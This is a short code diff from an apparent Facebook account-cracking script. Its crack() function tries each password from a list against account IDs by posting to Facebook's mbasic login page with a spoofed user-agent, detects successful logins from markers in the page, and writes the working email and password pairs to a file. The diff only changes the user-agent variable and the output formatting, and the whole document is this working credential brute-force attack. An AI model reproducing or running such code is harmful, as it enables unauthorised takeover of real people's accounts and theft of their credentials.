@@ -244,12 +244,12 @@ def crack():
 		try:
 			for pw in ra_pw:
 				pw = pw.lower()
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': rafi_ua})
+				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': rax_x, 'pass': pw, 'login': 'submit'}, headers={'user-agent': raka_ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
-					print('  \r\x1b[1;92m [RAKA_AMANDA OK] ' +rax_x+ ' <-> ' + pw + '       ')
+					print('\r  ==-[ ' +rax_x+ '|' + pw + '       ',']-==')
 					ok.append(rax_x+'|'+pw)
-					save.write(' [RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
+					save.write('  [RAKA_AMANDA OK] '+str(rax_x)+'|'+str(pw)+'\n')
 					save.close()
 					break
 					continue
